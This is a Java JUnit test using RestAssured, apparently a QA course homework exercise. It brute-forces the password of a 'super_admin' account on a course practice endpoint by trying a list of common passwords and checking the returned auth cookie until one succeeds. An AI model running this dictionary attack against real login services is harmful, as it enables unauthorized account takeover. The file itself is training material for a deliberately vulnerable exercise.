import io.restassured.RestAssured;
import io.restassured.response.Response;
import java.util.HashMap;
import java.util.Map;
import org.junit.jupiter.api.Test;


public class Ex9 {

    String[] passwords = new String[]{"password", "123456", "123456789", "12345678", "12345", "qwerty", "abc123",
            "football", "1234567", "monkey", "111111", "letmein", "1234", "1234567890", "dragon", "baseball",
            "sunshine", "iloveyou", "trustno1", "princess", "adobe123", "123123", "welcome", "login", "admin",
            "solo", "1q2w3e4r", "master", "666666", "photoshop", "1qaz2wsx", "qwertyuiop", "ashley", "mustang",
            "121212", "starwars", "654321", "bailey", "access", "flower", "555555", "passw0rd", "shadow", "lovely",
            "7777777", "michael", "!@#$%^&*", "jesus", "password1", "superman", "hello", "charlie", "888888", "696969",
            "hottie", "freedom", "aa123456", "qazwsx", "ninja", "azerty", "123qwe", "loveme", "whatever", "donald",
            "batman", "zaq1zaq1", "Football", "000000"};

    @Test
    public void testRestAssured() {
        for (String password : passwords) {
            Response authResponse = RestAssured
                    .given()
                    .queryParam("login", "super_admin")
                    .queryParam("password", password)
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            String auth_cookie = authResponse.getCookie("auth_cookie");


            Map<String, String> data = new HashMap<>();
            data.put("login", "super_admin");
            data.put("password", password);

            Response response = RestAssured
                    .given()
                    .body(data)
                    .cookie("auth_cookie", auth_cookie)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();

            String checkAuthCookieResult = response.body().asString();
            if (!checkAuthCookieResult.equalsIgnoreCase("You are NOT authorized")) {
                System.out.println(password);
                System.out.println(checkAuthCookieResult);
                break;
            }
        }
    }
}
